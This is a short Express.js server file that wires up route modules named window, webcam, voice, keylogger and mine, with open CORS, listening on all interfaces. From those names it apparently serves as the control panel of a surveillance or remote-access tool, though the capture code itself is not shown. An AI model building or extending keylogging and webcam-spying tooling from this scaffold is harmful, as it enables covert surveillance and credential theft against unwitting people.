const express = require('express');
const app = express();
const path = require('path');
const window = require('./router/window')
const webcam = require('./router/webcam')
const voice = require('./router/voice')
const keylogger = require('./router/keylogger')
const main = require('./router/mine')
const port = 3000;

app.use(express.json()); 
app.use(express.urlencoded({ extended: true })); 

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});
app.set('view engine', 'html'); // Set the view engine to HTML
app.set('views', path.join(__dirname, './html')); // Set the views directory
app.use(express.static(path.join(__dirname, './public')));
app.use(express.static(path.join(__dirname, './html')));


app.get('/', (req, res) => {
  res.redirect('/main');
});

window(app,path)
webcam(app,path)
voice(app,path)
keylogger(app,path)
main(app,path)

app.use((req, res, next) => {
  res.status(404).sendFile(path.join(__dirname, './html', '404.html'));
});

// start server
const server = app.listen(port, '0.0.0.0', () => {
    const port = server.address().port;
    console.log(`Server is running on port ${port}`);
  });